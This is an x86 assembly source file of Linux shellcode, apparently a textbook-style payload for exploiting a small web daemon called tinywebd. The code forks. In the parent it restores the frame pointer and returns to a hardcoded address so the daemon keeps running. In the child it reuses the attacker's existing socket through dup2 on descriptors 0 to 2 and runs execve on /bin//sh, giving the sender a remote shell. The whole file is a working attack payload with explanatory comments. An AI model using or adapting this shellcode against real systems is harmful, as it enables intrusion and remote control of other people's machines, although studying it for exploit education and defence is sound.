BITS 32

   push BYTE 0x02    ; fork is syscall #2
   pop eax
   int 0x80          ; after the fork, in child process eax == 0
   test eax, eax
   jz child_process  ; in child process spawn a shell

      ; in the parent process, restore tinywebd
   lea ebp, [esp+0x68]  ; restore EBP
   push 0x08048fb7      ; return address
   ret                  ; return

child_process:
    ; re-use existing socket
   lea edx, [esp+0x5c]  ; put the address of new_sockfd in edx
   mov ebx, [edx]       ; put the value of new_sockfd in ebx
   push BYTE 0x02
   pop ecx          ; ecx starts at 2
   xor eax, eax
   xor edx, edx
dup_loop:
   mov BYTE al, 0x3F ; dup2  syscall #63
   int 0x80          ; dup2(c, 0)
   dec ecx           ; count down to 0 
   jns dup_loop      ; if the sign flag is not set, ecx is not negative


; execve(const char *filename, char *const argv [], char *const envp[])
   mov BYTE al, 11   ; execve  syscall #11
   push edx          ; push some nulls for string termination
   push 0x68732f2f   ; push "//sh" to the stack
   push 0x6e69622f   ; push "/bin" to the stack
   mov ebx, esp      ; put the address of "/bin//sh" into ebx, via esp
   push edx          ; push 32-bit null terminator to stack
   mov edx, esp      ; this is an empty array for envp
   push ebx          ; push string addr to stack above null terminator
   mov ecx, esp      ; this is the argv array with string ptr
   int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
